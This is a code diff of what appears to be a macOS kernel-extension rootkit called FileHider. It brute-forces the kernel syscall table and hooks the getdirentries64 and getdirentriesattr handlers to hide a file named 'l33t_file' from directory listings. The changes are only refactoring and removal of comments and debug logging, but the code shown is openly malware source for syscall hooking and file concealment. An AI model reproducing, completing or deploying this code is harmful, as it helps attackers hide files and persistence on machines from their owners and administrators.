@@ -12,11 +12,9 @@ kern_return_t FileHider_start(kmod_info_t * ki, void *d)
         return KERN_FAILURE;
     }
     
-    struct sysent *table = find_sysent();
-    
-    if( table == NULL )
+    if( ( table = find_sysent() ) == NULL )
     {
-        DLOG( "[+] Error: Unable to resolve _nsysent!\n" );
+        DLOG( "[+] Error: Unable to find _sysent!\n" );
         return KERN_FAILURE;
     }
     else
@@ -43,11 +41,9 @@ kern_return_t FileHider_stop(kmod_info_t *ki, void *d)
         return KERN_FAILURE;
     }
     
-    struct sysent *table = find_sysent();
-    
-    if( table == NULL )
+    if( ( table = find_sysent() ) == NULL )
     {
-        DLOG( "[+] Error: Unable to resolve _nsysent!\n" );
+        DLOG( "[+] Error: Unable to find _sysent!\n" );
         return KERN_FAILURE;
     }
     
@@ -62,7 +58,6 @@ kern_return_t FileHider_stop(kmod_info_t *ki, void *d)
 
 static char fname[] = "l33t_file";
 
-//register_t new_getdirentries64( struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval )
 int new_getdirentries64( struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval )
 {
     int ret;
@@ -124,11 +119,9 @@ struct FInfoAttrBuf {
 
 typedef struct FInfoAttrBuf FInfoAttrBuf;
 
-//register_t new_getdirentriesattr( struct proc *p, struct getdirentriesattr_args *uap, register_t *retval )
 int new_getdirentriesattr( struct proc *p, struct getdirentriesattr_args *uap, register_t *retval )
 {
     struct FInfoAttrBuf *dirp;
-    //register_t ret;
     int ret;
     int removed = 0;
     u_int count = 0;
@@ -196,7 +189,6 @@ static struct sysent *find_sysent( void )
     //                               ((uint64_t)sizeof(struct sysent) *
     //                               (uint64_t)*nsysent));
     // so we're off for some dirty brute forcing:
-    
     int *addr = nsysent;
     
     while( 1 )  // o.0!
@@ -332,15 +324,6 @@ find_symbol(struct mach_header_64 *mh, const char *name)
         DLOG("FAIL: couldn't find SYMTAB\n");
         return NULL;
     }
-    
-    //DLOG( "[+] __TEXT.vmaddr      0x%016llX\n", mlc->vmaddr );
-    //DLOG( "[+] __LINKEDIT.vmaddr  0x%016llX\n", mlinkedit->vmaddr );
-    //DLOG( "[+] __LINKEDIT.vmsize  0x%08llX\n", mlinkedit->vmsize );
-    //DLOG( "[+] __LINKEDIT.fileoff 0x%08llX\n", mlinkedit->fileoff );
-    //DLOG( "[+] LC_SYMTAB.stroff   0x%08X\n", msymtab->stroff );
-    //DLOG( "[+] LC_SYMTAB.strsize  0x%08X\n", msymtab->strsize );
-    //DLOG( "[+] LC_SYMTAB.symoff   0x%08X\n", msymtab->symoff );
-    //DLOG( "[+] LC_SYMTAB.nsyms    0x%08X\n", msymtab->nsyms );
     
     /*
      * Enumerate symbols until we find the one we're after
